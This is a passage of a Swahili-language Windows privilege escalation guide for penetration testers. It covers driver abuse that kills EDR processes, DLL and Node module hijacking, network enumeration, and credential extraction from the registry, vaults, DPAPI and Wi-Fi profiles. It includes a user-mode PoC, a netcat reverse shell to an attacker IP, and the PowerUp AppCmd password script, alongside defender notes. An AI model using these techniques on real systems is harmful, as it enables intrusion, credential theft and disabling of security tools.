- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza katika `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani hasi inayodhibitiwa na mshambulizi kwenye scalar iliyotumika tena, swali linalofuata la `REG_BINARY` hunakili baiti za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu, jambo ambalo mara nyingi ndiyo njia safi zaidi ya kufuta kikamilifu pointer ya callback.

Muundo muhimu wa kutafuta: **usomaji wa registry wa aina tofauti kwenye variable ileile ya stack bila kuiweka upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zilizotumika tena, na njia za code ambazo usomaji wa kwanza wa registry hudhibiti kama usomaji wa pili utafanyika.

#### Kutumia vibaya kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizotiwa saini huunda device object yao kwa SDDL yenye ulinzi thabiti kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL hailazimishwi kifaa kinapofunguliwa kupitia path iliyo na component ya ziada, hivyo mtumiaji yeyote asiye na ruhusa za juu anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishaweza kufungua kifaa, anaweza kutumia vibaya IOCTLs za upendeleo wa juu zinazotolewa na driver kwa LPE na tampering. Uwezo ulioonekana kwenye mifumo halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zisizochaguliwa (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vizuizi (tampering wakati mfumo uko offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, zikiwemo Protected Process/Light (PP/PPL), na kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mikakati ya kupunguza hatari kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa shughuli zenye ruhusa za juu. Fanya ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handle.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa ingizo) na uzingatie miundo ya broker badala ya kutumia ruhusa za kernel moja kwa moja.

Mawazo ya kugundua kwa defenders
- Fuatilia ufunguaji wa majina ya device yanayotiliwa shaka kutoka user mode (k.m., \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folda iliyo kwenye PATH**, unaweza kuweza kuteka nyara DLL inayopakiwa na process na **kupandisha ruhusa**.<sup>[[2]](#references)</sup>

Angalia ruhusa za folda zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import ya kawaida kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hiyo programu iliyozinduliwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta katika:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye mapendeleo ya chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye mapendeleo ya juu** ujaribu kutatua utegemezi unaokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, hivyo hali hii huwa **LPE** wakati wowote target inapotekelezwa kama administrator, kupitia scheduled task/wrapper ya service iliyopewa mapendeleo yaliyoinuliwa, au kupitia programu ya desktop yenye mapendeleo inayojiwasha kiotomatiki.

Hili hutokea hasa wakati:

- utegemezi umetajwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya mtu mwingine imeweka `require("foo")` ndani ya `try/catch` na inaendelea iwapo itashindwa
- package iliondolewa kwenye builds za production, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya mti wa utegemezi badala ya kuwa kwenye code kuu ya programu

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable inayolengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Zingatia matokeo ya `NAME NOT FOUND` na jaribio la mwisho lililofanikiwa la kufungua faili chini ya `C:\node_modules`

Mifumo muhimu ya kukagua kwenye code iliyo ndani ya faili za `.asar` zilizofunguliwa au kwenye chanzo cha programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Washa application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya module za hiari zinazokosekana katika matumizi halisi na zinazofuata muundo huu ni `bluebird` na `utf-8-validate`, lakini **technique** ndiyo inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows wa Node/Electron wenye privileged access utajaribu ku-resolve.

### Mawazo ya utambuzi na kuimarisha usalama

- Weka alert mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta michakato yenye high integrity inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kutafuta mifumo ya `try { require("...") } catch {}` inayoficha hitilafu.
- Zima majaribio ya hiari ikiwa library inaruhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka probe ya zamani ya `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Folda zilizoshirikiwa

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili ya hosts

Kagua kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye faili ya hosts

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Porti Zilizo Wazi

Angalia **huduma zilizozuiliwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama mtumiaji wa desktop yake tu ikiwa uthibitishaji wake na vidhibiti vya amri vinaruhusu. Custom TCP application inayoendeshwa chini ya akaunti yenye privileges za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni vidokezo vya awali tu, huku njia ya memory-corruption iliyothibitishwa ikihitaji uchambuzi wa binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha backend service; forwarding rule pekee haithibitishi kwamba destination inaweza kufikiwa au iko vulnerable.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

[Amri zaidi za kuorodhesha mtandao zipo hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itauliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` wa Linux ndani ya WSL hakukupi moja kwa moja haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distribution, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kutafuta amri ambazo huenda zilirekodi credentials; privilege escalation bado inahitaji akaunti halali yenye priviliji za juu zaidi na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` hutumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distribution kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hivyo tambua kwanza distribution na njia halisi ya hifadhi. Epuka kuonyesha maudhui ya historia wakati wa enumeration ya kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ugunduzi wa plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna nenosiri la plaintext linalosomeka, hiyo ni lead tu: [Sysinternals Autologon inaweza kuhifadhi nenosiri kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na kusoma registry kwa njia za kawaida hakuthibitishi kama secret hiyo ipo au inaweza kurejeshwa. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuka kwa credential.

### Credential Manager / Windows Vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia kiotomatiki kama watumiaji**. Mwanzoni, hili linaweza kusikika kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki, yaani, **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa kutumia seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au [moduli ya Powershell ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonyeshwa pia kama `Web Credentials` katika `vaultcmd`). Eneo hili la hifadhi hutenganishwa kwa kila session na linaweza kusimbuliwa kwa njia asilia bila haki za kiutawala au za `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session inayotumika ya mtumiaji ili kutoa na kusimbua mara moja majina yote ya watumiaji na nywila za maandishi wazi zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya usimbaji fiche linganifu wa data, inayotumiwa hasa ndani ya mfumo endeshi wa Windows kwa usimbaji fiche linganifu wa funguo za faragha zisizo linganifu. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa fiche kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na data ya nasibu yenye ukubwa wa baiti 64. (Ni muhimu kutambua kuwa ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **moduli ya mimikatz** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuifungua kwa usimbuaji.

**Faili za credentials zinazolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vitambulisho vya PowerShell

**Vitambulisho vya PowerShell** hutumiwa mara nyingi kwa **scripting** na kazi za automation kama njia rahisi ya kuhifadhi vitambulisho vilivyosimbwa. Vitambulisho hivyo hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba vinaweza kusimbuliwa tu na mtumiaji yuleyule kwenye kompyuta ileile vilipoundiwa.

Credential iliyohamishwa inaweza kuwa na jina la faili au njia ya `.xml` yoyote. Script au orodha ya faili ikionyesha mojawapo, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows inaweza kuweka profiles mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufunga credential iliyosimbwa kwa mtumiaji na kompyuta iliyoi-export](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima iwe na ruhusa halali kwenye service inayolengwa. Kagua njia na ACL kwanza, bila kuchapisha thamani zilizosimbwa au zilizo wazi wakati wa uorodheshaji wa kawaida.

Ili **kusimbua** credential ya PS kutoka kwenye faili iliyo nayo, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikiwemo faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama dalili ya kupata credentials. Thamani iliyohifadhiwa si nywila ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji fiche ya faili na ikiwa nywila maalum ya master ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji mpana.

**Exports za profaili za Remote Desktop Plus** zinaweza pia kusomeka kwenye directories za watumiaji au folda ya pamoja ya usimamizi. Export ya zamani ya `profiles.xml` ina maingizo ya `Data/Profile` yenye elementi za `ProfileName`, `Password`, na `Secure`. Chukulia elementi ya nywila isiyo tupu kama dalili ya kupata credentials, bila kuichapisha au kudhani kuwa ni maandishi wazi: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profaili unaweza kuhusishwa na akaunti na kompyuta iliyoitengeneza, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha asili ya faili na masharti ya urejeshaji kabla ya kutegemea taarifa hizo.

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstation za Windows **kuhifadhi nywila** na taarifa nyingine, bila kujua kuwa ni faili ya database. Faili hii iko hapa `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kutafutwa na kuchunguzwa kila wakati.

Wakati mwingine watu huhifadhi nywila na taarifa nyingine kwenye apps za sticky-note. App ya Sticky Notes iliyosakinishwa kwa mfumo wa Microsoft kwa kawaida huhifadhi notes hapa `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; apps za zamani au tofauti zinaweza kutumia hifadhi nyingine kwenye wasifu wa mtumiaji, ikiwemo LevelDB. Tambua app iliyosakinishwa na muundo wa hifadhi kabla ya kuhitimisha kuwa hakuna notes kwa sababu faili ya SQLite haipo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa notes za hivi karibuni zilizohifadhiwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; faharasa ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [nyaraka za SQLite kuhusu WAL](https://www.sqlite.org/wal.html). Note yenye jina la akaunti au nywila ni dalili tu ya kupata credentials: thibitisha akaunti, ruhusa za ufikiaji, na matumizi tena ya nywila kando. Rekodi iliyosimbwa ya password manager pia inahitaji ufunguo wake halisi wa kusimbua na ufasiri maalum wa app kabla ya kuthibitisha kuwa inaweza kuingia kwenye akaunti yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha nywila kutoka AppCmd.exe, unahitaji kuwa Administrator na kuiendesha chini ya kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, basi inawezekana kuwa baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa SYSTEM privileges**, wengi wako hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Mabaki ya credentials za registry za zana za usaidizi

Baadhi ya usakinishaji wa zamani wa usaidizi wa mbali huhifadhi majina ya thamani yanayohusiana na nywila chini ya funguo maalum za registry za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha nywila tuli ya kipindi iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu funguo za registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la thamani ni kidokezo tu cha ukaguzi: thibitisha toleo lililosakinishwa, data ya thamani inayosomeka, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka nywila ya usaidizi wa mbali hadi akaunti ya Windows yenye ruhusa za juu zaidi kunahitaji pia matumizi tena ya nywila hiyo na idhini ya kutumia akaunti husika. Usijumuishe ciphertext wala nywila zilizorejeshwa kwenye matokeo ya kawaida ya enumerations.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa kuna shaka kuwa workbook inayosomeka na kushirikiwa ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kwamba ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa yaliyomo kwenye workbook yamesimbwa kwa njia fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na epuka kuchapisha siri zinazoweza kuwa humo wakati wa enumeration pana. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa pekee haithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina ruhusa za juu zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

### Mabaki ya patches za mabadiliko kwenye seva ya CI

